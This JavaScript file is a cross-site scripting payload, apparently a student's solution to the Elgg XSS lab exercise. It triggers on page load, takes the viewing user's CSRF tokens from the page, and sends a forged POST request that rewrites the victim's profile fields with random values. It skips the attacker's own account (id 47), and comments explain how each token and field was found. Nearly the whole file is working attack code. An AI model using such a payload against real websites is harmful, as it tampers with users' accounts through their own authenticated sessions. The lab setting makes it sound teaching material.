// I logged 'elgg' object in console upon window.onload.
// By this I acquired the knowledge of all the methods and fields of this 'elgg' object.

window.onload = function () {
  // First I checked if the logged in user's id is Samy (Hacker)'s id (47).
  // If it is I didn't make the add friend call.
  if (elgg.get_logged_in_user_guid() !== 47) {
    editProfile();
  }
};

function editProfile() {
  const ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
  const token = "&__elgg_token=" + elgg.security.token.__elgg_token;

  // I acquried the structure of the request url and content by observing the 'Network' tab
  // of Browser Inspection after pressing the 'Save' Button in profile edit
  const sendurl = "http://www.xsslabelgg.com/action/profile/edit";

  // I acquired the value of 'Logged in user' by making a edit request
  // with 'Logged in user' selected
  const accessLevels =
    "&accesslevel[briefdescription]=1&accesslevel[contactemail]=1&accesslevel[description]=1&accesslevel[interests]=1&accesslevel[location]=1&accesslevel[mobile]=1&accesslevel[phone]=1&accesslevel[skills]=1&accesslevel[twitter]=1&accesslevel[website]=1";
  const briefDescription = "&briefdescription=1605077";
  const uid = "&guid=" + elgg.get_logged_in_user_guid().toString();
  // I acquired the value of 'User Entities' fields by
  // by calling 'elgg.get_logged_in_user_entity()' upon window.onload
  const name = "&name=" + elgg.get_logged_in_user_entity().name;
  const others = `${briefDescription}&contactemail=${randomString(
    6
  )}@gmail.com&description=${randomString(6)}${uid}&interests=${randomString(
    6
  )}&location=${randomString(6)}&mobile=${randomString(
    6
  )}${name}&phone=${randomString(6)}&skills=${randomString(
    6
  )}&twitter=${randomString(6)}&website=www.${randomString(6)}.com`;

  // I maintained the order of the fields in the request
  const content = ts + token + accessLevels + others;

  const Ajax = new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);

  console.log("Automatically Edited Profile");
}

function randomString(length) {
  let result = "";
  let characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
